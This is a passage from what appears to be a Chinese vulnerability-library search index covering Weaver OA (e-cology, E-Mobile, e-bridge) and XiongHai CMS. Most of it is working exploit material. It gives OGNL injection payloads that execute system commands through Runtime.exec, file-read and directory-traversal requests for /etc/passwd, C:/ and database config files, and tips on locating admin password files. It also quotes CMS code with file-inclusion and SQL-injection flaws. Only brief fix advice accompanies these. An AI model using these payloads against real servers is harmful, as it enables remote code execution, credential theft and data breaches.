<p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","title":"\u5371\u5bb3\u7b49\u7ea7","text":"<pre><code>\u4e25\u91cd\n\n12\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u539f\u7406","text":"<p>\u6cdb\u5faee-cology OA\u7cfb\u7edf\u7684<code>WorkflowCenterTreeData</code>\u63a5\u53e3\u5728\u63a5\u6536\u5230\u7528\u6237\u8f93\u5165\u65f6\u4f1a\u5728\u672a\u7ecf\u8fc7\u5b89\u5168\u8fc7\u6ee4\u7684\u60c5\u51b5\u4e0b\u76f4\u63a5\u62fc\u63a5\u5230SQL\u8bed\u53e5\u4e2d\uff0c\u9020\u6210SQL\u6ce8\u5165\u3002</p> <p></p> <p>\uff08\u4e0a\u56fe\u6765\u6e90\u4e8e\u7f51\u7edc\uff09</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_4","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>\u6240\u6709\u4f7f\u7528\u4e86Oracle\u6570\u636e\u5e93\u7684\u6cdb\u5fae\u670d\u52a1\u90fd\u6709\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>\u76ee\u524dFOFA\u5ba2\u6237\u7aef\u5e73\u53f0\u5df2\u7ecf\u66f4\u65b0\u8be5\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u68c0\u6d4bPOC\u3002    POC\u622a\u56fe</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#cve","title":"CVE\u7f16\u53f7","text":"<pre><code>\u6682\u65e0\u7f16\u53f7 \n\n12\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_5","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u7531\u4e8e\u76ee\u524d\u6ca1\u6709\u5b98\u65b9\u8865\u4e01\uff0c\u8bf7\u4f7f\u7528\u4e86\u6cdb\u5fae\u529e\u516c\u8f6f\u4ef6\u4e14\u540e\u7aef\u6570\u636e\u5e93\u662fOracle\u7684\u7f51\u7ad9\u7684\u7ba1\u7406\u5458\u53ca\u65f6\u4e0b\u7ebf\u7f51\u7ad9\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_6","title":"\u53c2\u8003","text":"<p>[1] https://www.weaver.com.cn/</p> <p>[2] https://baike.baidu.com/item/%E6%B3%9B%E5%BE%AE/426156?fr=aladdin</p> <p>\u767d\u5e3d\u6c47\u4ece\u4e8b\u4fe1\u606f\u5b89\u5168\uff0c\u4e13\u6ce8\u4e8e\u5b89\u5168\u5927\u6570\u636e\u3001\u4f01\u4e1a\u5a01\u80c1\u60c5\u62a5\u3002</p> <p>\u516c\u53f8\u4ea7\u54c1\uff1aFOFA-\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u641c\u7d22\u5f15\u64ce\u3001FOEYE-\u7f51\u7edc\u7a7a\u95f4\u68c0\u7d22\u7cfb\u7edf\u3001NOSEC-\u5b89\u5168\u8baf\u606f\u5e73\u53f0\u3002</p> <p>\u4e3a\u60a8\u63d0\u4f9b\uff1a\u7f51\u7edc\u7a7a\u95f4\u6d4b\u7ed8\u3001\u4f01\u4e1a\u8d44\u4ea7\u6536\u96c6\u3001\u4f01\u4e1a\u5a01\u80c1\u60c5\u62a5\u3001\u5e94\u6025\u54cd\u5e94\u670d\u52a1\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5/","title":"\u6cdb\u5faee mobile ognl\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5/#e-mobile-ognl","title":"\u6cdb\u5faee-mobile ognl\u6ce8\u5165","text":"<p>\u6cdb\u5fae E-Mobile \u8868\u8fbe\u5f0f\u6ce8\u5165?\u5927\u6982?\u8fd9\u4e2a\u6d1e\u662f\u4e00\u4e2a\u6708\u4ee5\u524d\uff0c\u8001\u5e08\u4e22\u7ed9\u6211\u73a9\u7684\uff0c\u53eb\u6211\u5b66\u4e60\u4e00\u4e0b\u3002 \u62ff\u5230\u7684\u65f6\u5019\u4e00\u8138\u61f5\u903c\uff0c\u4ec0\u4e48\u662f\u8868\u8fbe\u5f0f\u6ce8\u5165?\u53bb\u6f0f\u6d1e\u5e93\u770b\u4e86\u4e00\u5708\u3002 (\u30fb\u3002\u30fb) \u5662\uff01\u539f\u6765\u53ef\u4ee5\u6267\u884c\u7b97\u672f\u8fd0\u7b97\u5c31\u662f\u8868\u8fbe\u5f0f\u6ce8\u5165\u5440\uff01 \u8981\u600e\u4e48\u73a9\uff1f\u5f53\u8ba1\u7b97\u5668\u7528\u4e48\uff1f\uff5e\u30fe(*\u00b4\u2207`)\uff89</p> <p>\u4e00\u3001\u6cdb\u5faeOA E-Mobile WebServer:Apache \u901a\u7528\u90e8\u5206:apache \u5b98\u65b9\u6709\u4e24\u4e2aOA\u3002\u4e00\u4e2a\u662f**apache**\u7684 \u4e00\u4e2a\u662f**Resin**\u7684\u3002 **Resin**\u7684\u4e5f\u627e\u5230\u59ff\u52bf\u901a\u6740\u4e86\uff0c\u4f46\u662f**Resin**\u6d89\u53ca\u7684\u7ad9\u592a\u5927\u4e86\u3002\u3002\u3002\u6682\u65f6\u4e0d\u653e\u51fa\u6765\uff0c\u56e0\u4e3a\u597d\u50cf\u548cS2\u649e\u6d1e\u4e86\uff1f\u56e0\u4e3a045\u6253\u4e86WAF\u7684 \uff0c\u6211\u8fd9\u4e2a\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u300223333 \u6211\u4e5f\u4e0d\u77e5\u9053~</p> <pre><code>1\u3001\u767b\u5f55\u9875\u9762\u5982\u4e0b\n\nhttp://6.6.6.6/login.do?\nor\nhttp://6.6.6.6/login/login.do?\n</code></pre> <pre><code>2\u3001\u5f53\u8d26\u53f7\u5bc6\u7801\u62a5\u9519\u7684\u65f6\u5019\uff0c\u51fa\u73b0\u5982\u4e0bURL\nlogin.do?message=104&amp;verify=\n</code></pre> <pre><code>3\u3001\u76f4\u63a5\u6539\u5199message=\u7684\u5185\u5bb9\uff0c\u8bd5\u8bd5\u7b97\u672f\u8fd0\u7b97\u3002\nhttp://6.6.6.6/login.do?message=66*66*66-66666\n</code></pre> <pre><code>4\u3001\u8868\u8fbe\u5f0f\u6ce8\u5165\u3002\n\u6709\u7684\u8868\u8fbe\u5f0f\u6ce8\u5165\u662f${code}\u3002\u8fd9\u91cc\u9690\u85cf\u4e86${}\uff0c\u6240\u4ee5\u76f4\u63a5\u8c03\u7528\u5c31\u884c\u4e86\u3002\nmessage=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())\n</code></pre> <pre><code>5\u3001\u4e5f\u53ef\u4ee5\u901a\u8fc7`post`\u63d0\u4ea4\u6570\u636e\u6765\u8fdb\u884c\u6ce8\u5165\uff0c\u547d\u4ee4\u6267\u884c\n`post`\u5982\u4e0b\u6570\u636e\u4e5f\u53ef\u4ee5\uff1a\nmessage=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&amp;cmd=whoami\n</code></pre> <p>====================================================================</p> <p>\u7f51\u7edc\u5b9e\u4f8b</p> <p></p> <p>\u6b64\u7248\u672c\u4e3a5.0</p> <p>\u9996\u5148\u968f\u4fbf\u8f93\u5165\u8d26\u53f7\u5bc6\u7801\u770b\u63d0\u793a\u4fe1\u606f</p> <p></p> <p>\u63d0\u793a\u4e3a104\uff0c\u5730\u5740\u680fmessage\u4e5f\u663e\u793a\u4e86104,\u73b0\u5728\u6d4b\u8bd5\u4e00\u4e0b\u770b\u770b\u6709\u6ca1\u6709\u6ce8\u5165</p> <p>\u76f4\u63a5\u83b7\u53d6\u6570\u636e\u6cd5: \u52a0\u51cf\u4e58\u9664</p> <p>\u8868\u8fbe\u5f0f\u83b7\u53d6\u6570\u636e\u8bed\u6cd5\uff1a\"\\({\u6807\u8bc6\u7b26}\"\uff0c\u4f46\u5728\u8fd9\u4e2a\u4e2d\u5e76\u4e0d\u9700\u8981\\){}\u6765\u5305\u62ec</p> <pre><code>http://www.xxx.com/login.do?message=104-2&amp;verify=\n</code></pre> <p></p> <p>\u7ed3\u679c\u53ef\u4ee5\u88ab\u6267\u884c\u6210\u529f\uff0c\u8868\u793a\u6f0f\u6d1e\u5b58\u5728\u53ef\u6ce8\u5165</p> <p>\u8fd9\u91cc\u6709\u4e24\u4e2apoc\u53ef\u5229\u7528</p> <pre><code>message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())\u4e0b\u9762\u9700\u8981Post\u8bf7\u6c42message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&amp;cmd=whoami\n</code></pre> <p></p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","title":"\u6cdb\u5fae\u4e91\u6865e-bridge \u76ee\u5f55\u904d\u5386/\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u4fe1\u606f:","text":"<p>\u6cdb\u5fae\u4e91\u6865\u662f\u4e00\u4e2a\u4e3a\u4e86\u6ee1\u8db3\u7528\u6237\u63d0\u51fa\u7684\u963f\u91cc\u9489\u9489\u4e0e\u6cdb\u5faeOA\u96c6\u6210\u9700\u6cdb\u5fae0A\u4e91\u6865e-bridge \u5176 /wxjsapi/saveYZJFile \u63a5\u53e3\u53ef\u4ee5\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u4fdd\u5b58\uff0c\u800c\u540e\u53ef\u901a\u8fc7/file/fileNoLogin/{id}\uff0c\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_2","title":"\u5f71\u54cd\u8303\u56f4:","text":"<p>\u4e3b\u8981\u5f71\u54cd 2018-2019 \u7248\u672c</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u590d\u73b0:","text":"<p>\u5982\u679c\u4f7f\u7528POC\u56de\u663e**<code>\"\u65e0\u6cd5\u9a8c\u8bc1\u60a8\u7684\u8eab\u4efd\uff01\"</code>\u8bc1\u660e\u6539\u6f0f\u6d1e\u5df2\u88ab\u4fee\u590d  **POC\u4e2d\uff0c\u5f53downloadUrl\u7684\u8def\u5f84\u4e3a\u6587\u4ef6\u5939\u7684\u65f6\u5019\u7ed3\u679c\u4e3a\u76ee\u5f55\u904d\u5386  linux windows \u901a\u7528  Windows POC\uff1a</p> <pre><code>/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/&amp;fileExt=txt #\u67e5\u770b\u9875\u9762\u4e2d\u7684id\u503c\n</code></pre> <p></p> <pre><code>/file/fileNoLogin/&lt;id&gt; #\u8bbf\u95ee\u6587\u4ef6\u63a5\u53e3\uff0c\u6839\u636e\u4e0a\u4e00\u6b65\u83b7\u53d6\u7684id\u5bf9\u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u8bfb\u53d6\n</code></pre> <p></p> <p>\u5982\u679c\u63d0\u793a<code>msg \"/C: (No such file or directory)\"</code>\u5c31\u8868\u793a\u4e3aLinux\u7cfb\u7edf\uff08\u8868\u793a\u4e0d\u5b58\u5728C\u76d8\uff09  Linux POC\uff1a</p> <pre><code>/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt\n/file/fileNoLogin/&lt;id&gt; #\u8bbf\u95ee\u6587\u4ef6\u63a5\u53e3\uff0c\u6839\u636e\u4e0a\u4e00\u6b65\u83b7\u53d6\u7684id\u5bf9\u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u8bfb\u53d6\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#04","title":"04 \u5b9e\u4f8b","text":"<p>Linux\u7cfb\u7edf\u4e3b\u76ee\u5f55\uff08\u6839\u76ee\u5f55\uff09    Linux\u4e2d/ect/passwd\u6587\u4ef6  </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5e-bridge%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_4","title":"\u4fee\u590d\u65b9\u6848:","text":"<p>\u5c3d\u5feb\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","title":"\u6cdb\u5fae\u4e91\u6865\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":"<p>\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6,/wxjsapi/saveYZJFile\u63a5\u53e3\u83b7\u53d6filepath,\u8fd4\u56de\u6570\u636e\u5305\u5185\u51fa\u73b0\u4e86\u7a0b\u5e8f\u7684\u7edd\u5bf9\u8def\u5f84,\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8fd4\u56de\u5185\u5bb9\u8bc6\u522b\u7a0b\u5e8f\u8fd0\u884c\u8def\u5f84\u4ece\u800c\u4e0b\u8f7d\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u5371\u5bb3\u53ef\u89c1\u3002 1\u3001 downloadUrl\u53c2\u6570\u4fee\u6539\u6210\u9700\u8981\u83b7\u53d6\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84,\u8bb0\u5f55\u8fd4\u56de\u5305\u4e2d\u7684id\u503c\u3002 </p> <p>2\u3001\u901a\u8fc7\u67e5\u770b\u6587\u4ef6\u63a5\u53e3\u8bbf\u95ee /file/fileNoLogin/id </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_1","title":"\u6cdb\u5fae\u4e91\u6865\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u5347\u7ea7\u73a9\u6cd5\u3002","text":"<p>1\u3001\u7b80\u5355\u8bf4\u8bf4\u6cdb\u5fae\u4e91\u6865\u7684\u62a5\u544a,\u8f93\u5165\u6587\u4ef6\u8def\u5f84-&gt;\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9,\u6211\u4eec\u8bfb\u4e86\u4e00\u4e0b\u4ee3\u7801\u540e\u53d1\u73b0\u8fd9\u8fd8\u80fd\u8bfb\u53d6\u6587\u4ef6\u76ee\u5f55\u3002 2\u3001\u53c2\u6570\u4e0d\u586b\u5199\u7edd\u5bf9\u8def\u5f84\u5199\u8fdb\u6587\u672c\u5185\u5bb9\u5c31\u662f\u5f53\u524d\u7684\u76ee\u5f55,\u4ea7\u751f\u4e86\u4e00\u4e2a\u65b0\u7684\u6f0f\u6d1e \u201c\u76ee\u5f55\u904d\u5386\u201d /wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///D:/&amp;fileExt=txt </p> <p>3\u3001\u76ee\u5f55\u904d\u5386+\u6587\u4ef6\u8bfb\u53d6,\u6211\u4eec\u80fd\u505a\u7684\u4e8b\u60c5\u5c31\u5f88\u591a\u4e86,\u6bd4\u5982\u8bfb\u53d6\u7ba1\u7406\u5458\u5728\u684c\u9762\u7559\u4e0b\u7684\u5bc6\u7801\u6587\u4ef6\u3001\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u3001nginx\u4ee3\u7406\u914d\u7f6e\u3001\u8bbf\u95ee\u65e5\u5fd7\u3001D\u76d8\u8fc5\u96f7\u4e0b\u8f7d\u3002 d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties \u6cdb\u5faeOA\u6570\u636e\u5e93 </p> <p>\u4fee\u590d\u5efa\u8bae: \u5173\u95ed\u7a0b\u5e8f\u8def\u7531 /file/fileNoLogin</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E4%B8%BB%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","title":"\u4e3b\u76ee\u5f55\u5b58\u5728\u6587\u4ef6\u5305\u542b","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E4%B8%BB%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>\u8ddf\u8fdb\u6587\u4ef6</p> <pre><code>&lt;?php\n//\u5355\u4e00\u5165\u53e3\u6a21\u5f0f\nerror_reporting(0); //\u5173\u95ed\u9519\u8bef\u663e\u793a\n$file=addslashes($_GET['r']); //\u63a5\u6536\u6587\u4ef6\u540d\n$action=$file==''?'index':$file; //\u5224\u65ad\u4e3a\u7a7a\u6216\u8005\u7b49\u4e8eindex\ninclude('files/'.$action.'.php'); //\u8f7d\u5165\u76f8\u5e94\u6587\u4ef6\n?&gt;\n</code></pre> <p>\u4ee3\u7801\u903b\u8f91\u5927\u6982\u4e3a\uff0c\u901a\u8fc7GET\u578b\u4f20\u53c2\u4f20\u5165r\uff0c\u5e76\u5c06\u503c\u7ecf\u8fc7\u4e00\u4e2aaddslashes()\u51fd\u6570\u64cd\u4f5c\uff0c\u7136\u540e\u4e00\u4e2a\u4e09\u5143\u8fd0\u7b97\u7b26\u5224\u65ad\u8981\u8f7d\u5165\u7684\u6587\u4ef6\uff0c\u76f4\u63a5\u8fdb\u5165include\u51fd\u6570\u5305\u542b\u3002</p> <p>include('files/'.$action.'.php');\u8fd9\u6761\u8bed\u53e5\u5305\u542b\u4e86file\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002</p> <pre><code>\u8bed\u6cd5\u4e3a\uff1a\u6761\u4ef6\u8868\u8fbe\u5f0f\uff1f\u8868\u8fbe\u5f0f1\uff1a\u8868\u8fbe\u5f0f2\n\n\u95ee\u53f7\u524d\u9762\u7684\u4f4d\u7f6e\u662f\u5224\u65ad\u7684\u6761\u4ef6\uff0c\u5224\u65ad\u7ed3\u679c\u4e3abool\u578b\uff0c\u4e3atrue\u662f\u8c03\u7528\u8868\u8fbe\u5f0f1\uff0c\u4e3afalse\u65f6\u8c03\u7528\u8868\u8fbe\u5f0f2.\n</code></pre> <p>\u7531\u4ee3\u7801\u903b\u8f91\u53ef\u77e5\uff0c\u4ee3\u7801\u9650\u5236\u4e86\u6211\u4eec\u8bbf\u95ee\u7684\u76ee\u5f55\u4e3afile\u3002</p> <p>Bypass:\u53ef\u7528../\u8fdb\u884c\u76ee\u5f55\u8df3\u8f6c\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E4%B8%BB%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#_2","title":"\u6f0f\u6d1e\u6f14\u793a","text":"<p>\u6211\u4eec\u9996\u5148\u5728cms\u6839\u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2aphpinfo\u6587\u4ef6 </p> <p>\u7136\u540e\u6211\u4eec\u5728\u672c\u5730\u8bbf\u95eeindex.php\u6dfb\u52a0\u5982\u4e0b\u53c2\u6570\u3002\u5373\u53ef\u6b63\u786e\u89e3\u6790phpinfo\u754c\u9762  \u56e0\u4e3a\u6b64\u5904\u4ee3\u7801\u4f1a\u81ea\u52a8\u5728\u6587\u4ef6\u540d\u540e\u6dfb\u52a0.php\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u6dfb\u52a0\u540e\u7f00\u540d\uff0c\u5426\u5219\u65e0\u6cd5\u6b63\u5e38\u89e3\u6790</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E4%B8%BB%E7%9B%AE%E5%BD%95%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#_3","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/7629</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%89%8D%E5%8F%B0%E5%A4%9A%E5%A4%84SQL%E6%B3%A8%E5%85%A5/","title":"\u524d\u53f0\u591a\u5904SQL\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%86%8A%E6%B5%B7CMS/%E5%89%8D%E5%8F%B0%E5%A4%9A%E5%A4%84SQL%E6%B3%A8%E5%85%A5/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>\u7ed3\u5408RIPS\u626b\u63cf\u7ed3\u679c\u53ef\u53d1\u73b0\u591a\u5904sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u8be5CMS\u91c7\u7528\u8fc7\u6ee4\u65b9\u5f0f\u5927\u591a\u662f\u901a\u8fc7addslashes()\u51fd\u6570\u8fc7\u6ee4\u3002 </p> <p>\u5355\u7eaf\u4f7f\u7528addslashes()\u51fd\u6570\u4f1a\u9020\u6210\u4e24\u4e2a\u95ee\u9898\uff1a</p> <p>1.\u662f\u5426\u91c7\u7528GBK\uff08\u5bbd\u5b57\u8282\u6ce8\u5165\uff09</p> <p>2.sql\u8bed\u53e5\u662f\u5426\u91c7\u7528\u4e86\u5355\u5f15\u53f7\u95ed\u5408\u3002</p> <p>software.php</p> <p>\u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/software.php\u7b2c13\u884c\uff0cwhere\u540e\u5b57\u53e5\u5fd8\u8bb0\u52a0\u5355\u5f15\u53f7\u4fdd\u62a4\u3002</p> <pre><code>$query = \"UPDATE download SET hit = hit+1 WHERE id=$id\";\n</code></pre> <p></p> <p>ontent.php</p> <p>\u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/content.php\u7b2c19\u884c\uff0cwhere\u540e\u5b57\u53e5\u5fd8\u8bb0\u52a0\u5355\u5f15\u53f7\u4fdd\u62a4\u3002</p> <pre><code>$query = \"UPDATE content SET hit = hit+1 WHERE id=$id\";\n</code></pre> <p>submit.php</p> <p>\u9996\u5148\u53ef\u770b\u89c1 \u8fc7\u6ee4\u548c\u4f20\u53c2</p> <pre><code>$type=addslashes($_GET['type']);\n$name=$_POST['name'];\n$mail=$_POST['mail'];\n$url=$_POST['url'];\n$content=$_POST['content'];\n$cid=$_POST['cid'];\n$ip=$_SERVER[\"REMOTE_ADDR\"];\n$tz=$_POST['tz'];\nif ($tz==\"\"){$tz=0;}\n$jz=$_POST['jz'];\n</code></pre> <p>\u53ea\u5bf9type\u53c2\u6570\u8fdb\u884c\u4e86\u8fc7\u6ee4\uff0c\u56e0\u6b64\u5176\u4ed6\u53c2\u6570\u6d89\u53ca\u5230sql\u8bed\u53e5\u7684\u53ef\u80fd\u5b58\u5728sql\u6ce8\u5165\u3002</p> <p>\u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/submit.php\u7b2c66\u884c</p> <pre><code>$query = \"SELECT * FROM interaction WHERE( mail = '$mail')\";\n</code></pre> <p>\u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/submit.php \u7b2c121-147\u884c</p> <pre><code>$query = \"INSERT INTO interaction (\ntype,\nxs,\ncid,\nname,\nmail,\nurl,\ntouxiang,\nshebei,\nip,\ncontent,\ntz,\ndate\n) VALUES (\n'$type',\n'$xs',\n'$cid',\n'$name',\n'$mail',\n'$url',\n'$touxiang',\n'$shebei',\n'$ip',\n'$content',\n'$tz',\nnow()\n)\";\n</code></pre> <p>\u6f0f\u6d1e\u4f4d\u7f6e\uff1afiles/submit.php \u7b2c176\u884c</p> <pre><code>$query = \"SELECT * FROM content WHERE( id= $cid)\";\n</code></pre> 